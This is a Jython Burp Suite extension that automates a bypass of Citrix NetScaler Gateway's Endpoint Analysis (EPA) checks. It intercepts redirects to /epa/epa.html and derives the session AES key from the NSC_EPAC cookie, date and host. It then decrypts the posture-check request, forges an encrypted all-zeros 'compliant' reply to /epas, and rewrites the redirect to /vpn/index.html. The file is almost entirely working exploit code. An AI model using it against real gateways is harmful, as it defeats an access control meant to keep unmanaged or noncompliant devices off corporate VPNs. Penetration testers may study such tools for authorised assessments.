# Burp Imports
from burp import IBurpExtender
from burp import IBurpExtenderCallbacks
from burp import IHttpListener
# Python Imports
import base64
import hashlib
# Java Imports
from javax.crypto import Cipher
from javax.crypto.spec import SecretKeySpec, IvParameterSpec
from java.util import Base64
from java.lang.System import currentTimeMillis
# Globals
__DEBUG__ = False

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("NetScalerEPA Bypass")
        callbacks.registerHttpListener(self)
        print '[*] NetScalerEPA Bypass Loaded'
        print '[*] Based on the original work from:\n\thttps://github.com/Lucky0x0D/NetScalerEPABypass and\n\thttps://parsiya.net/blog/2018-12-24-cryptography-in-python-burp-extensions\n\n'
        print '[+] Listening for redirects to /epa/epa.html\n'

    def get_NSC_EPAC_from_response(self, response_info):
        for c in response_info.getCookies():
            if c.getName() == "NSC_EPAC":
                return c.getValue()
        return None

    def get_CSEC_value_from_response(self, response_info):
        for h in response_info.getHeaders():
            if "CSEC" in h:
                return h.split(': ')[1]
        return None

    def processHttpMessage(self, toolFlag, messageIsRequest, currentMessage):
        # Operate on proxy and repeater
        if  toolFlag == self._callbacks.TOOL_PROXY or \
            toolFlag == self._callbacks.TOOL_REPEATER:
            if not messageIsRequest:
                self.processResponse(currentMessage)
            else:
                pass

    def processResponse(self, currentMessage):
        response_info=self._helpers.analyzeResponse(currentMessage.getResponse())
        # Listen for redirects to epa.html
        if response_info.getStatusCode() == 302:
            headers=response_info.getHeaders()
            if "Location: /epa/epa.html" in headers:
                # Get Cookie from Response
                NSC_EPAC=self.get_NSC_EPAC_from_response(response_info)
                if NSC_EPAC:
                    if self.bypassNSEPA(NSC_EPAC, currentMessage.getHttpService()):
                        # If successful bypass, redirect to /vpn/index.html
                        response=self._helpers.bytesToString(currentMessage.getResponse())
                        response=response.replace("/epa/epa.html", "/vpn/index.html")
                        currentMessage.setResponse(self._helpers.stringToBytes(response))
                        return currentMessage
                    else:
                        print "[-] Could't bypass NSEPA, please refresh cookies and try again"
                else:
                    print "[-] No NSC_EPAC cookie Set"

    def do_request(self, url_path, headers, service_info, body=None, cookies=None):
        host=service_info.getHost()
        port=service_info.getPort()
        use_Https=True if service_info.getProtocol() == "https" else False
        h=("POST " if body else "GET ") + \
        url_path + \
        " HTTP/1.1"
        host_header="Host: "+host
        headers=[h]+[host_header]+headers
        headers.append(cookies) if cookies else None
        request=self._helpers.buildHttpMessage(headers,body)
        if __DEBUG__:
            print "\n[**] ==================== Requesting: ====================\n",self._helpers.bytesToString(request)
        response=self._callbacks.makeHttpRequest(host, port, use_Https, request)
        if __DEBUG__:
            print "\n[**] ====================  Response:  ====================\n",self._helpers.bytesToString(response)
        return response

    def bypassNSEPA(self, NSC_EPAC_cookie, service_info):
        # Current time in seconds
        date=str(currentTimeMillis() / 1000)
        # Message Headers from nsepa
        headers=[
            "X-Citrix-NG-Capabilities: extcookie,",
            "Cookie: NSC_EPAC="+NSC_EPAC_cookie,
            "Date: "+date,
            "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; AGEE 8.0;) NAC/1.0 plugin 12.1.52.15",
            "Cache-Control: no-cache",
            "Connection: close"
        ]
        epatype_response=self.do_request("/epatype", headers, service_info)
        epatype_response_info=self._helpers.analyzeResponse(epatype_response)
        epatype_responseBody=self._helpers.bytesToString(epatype_response[epatype_response_info.getBodyOffset():])
        if "Epa:on" in epatype_responseBody:
            epaq_response=self.do_request("/epaq", headers, service_info)
            epaq_response_info=self._helpers.analyzeResponse(epaq_response)
            CSEC=self.get_CSEC_value_from_response(epaq_response_info)
            if CSEC:
                #Decrypt CSEC request and get encrypted response
                #str convert values from utf-8
                CSEC_response=self.get_CSEC_response(str(NSC_EPAC_cookie), date, str(service_info.getHost()), CSEC)
                if CSEC_response:
                    headers.append("CSEC: "+CSEC_response)
                    epas_response=self.do_request("/epas", headers, service_info)
                    epas_response_info=self._helpers.analyzeResponse(epas_response)
                    #TODO: Decrypt repose Body
                    return True
            else:
                print "[-] No CSEC value found in /epaq response"
                return False
        return False

    #####################################################################################################
    #   https://parsiya.net/blog/2018-12-24-cryptography-in-python-burp-extensions/#aes-cfb-nopadding   #
    #####################################################################################################
    # encryptJython uses javax.crypto.Cipher to encrypt payload with key/iv
    # using AES/CBC/NOPADDING
    def encryptJython(self, payload, key, iv):
        aesKey = SecretKeySpec(key, "AES")
        aesIV = IvParameterSpec(iv)
        cipher = Cipher.getInstance("AES/CBC/NOPADDING")
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, aesIV)
        encrypted = cipher.doFinal(payload)
        return Base64.getEncoder().encode(encrypted)

    # decryptJython uses javax.crypto.Cipher to decrypt payload with key/iv
    # using AES/CFB/NOPADDING
    def decryptJython(self, payload, key, iv):
        decoded = Base64.getDecoder().decode(payload)
        aesKey = SecretKeySpec(key, "AES")
        aesIV = IvParameterSpec(iv)
        cipher = Cipher.getInstance("AES/CBC/NOPADDING")
        cipher.init(Cipher.DECRYPT_MODE, aesKey, aesIV)
        return cipher.doFinal(decoded)

    #####################################################################################################
    #       https://github.com/Lucky0x0D/NetScalerEPABypass                                             #
    #####################################################################################################
    def str_to_hex(self, value):
        output=''
        for i in range(0, len(value), 2):
            output = output + chr( int(value[i:i+2],16))
        return output

    def get_CSEC_response(self, NSC_EPAC_cookie, date, host, EPAcrypt64):
        cookie=NSC_EPAC_cookie[:32]
        #Load Cookie as hex
        hexcookie=self.str_to_hex(cookie)
        ## Build the key source
        keystring = "NSC_EPAC=" + cookie + "\r\n" + date + "\r\n" + host + "\r\n" + hexcookie
        ## Hash the key source
        hashedinput = hashlib.sha1(keystring).hexdigest()
        ## load the hex of the ascii hash
        key=self.str_to_hex(hashedinput)
        ## Take the first 16 bytes of the key
        key = key[:16]
        print "[+] The key for this session is:\n",' '.join(x.encode('hex') for x in key)
        decrypted= self._helpers.bytesToString(self.decryptJython(EPAcrypt64,key,hexcookie)).strip()
        print "[*] The NetScaler Gateway EPA request: \n\r" + decrypted
        ## Figure out how many '0's to respond with
        ## (semi-colon is the EPA request delimiter)
        CSECitems = (decrypted.count(';'))
        #Add PKCS5 Padding (string to be encrypted must be a multiple of 16 bytes)
        padding=16-(decrypted.count(';'))
        CSEC_response = (chr(48)*CSECitems)+(chr(padding)*padding)
        ## Encryption
        encrypted_CSEC_response=self.encryptJython(CSEC_response,key,hexcookie)
        return self._helpers.bytesToString(encrypted_CSEC_response)

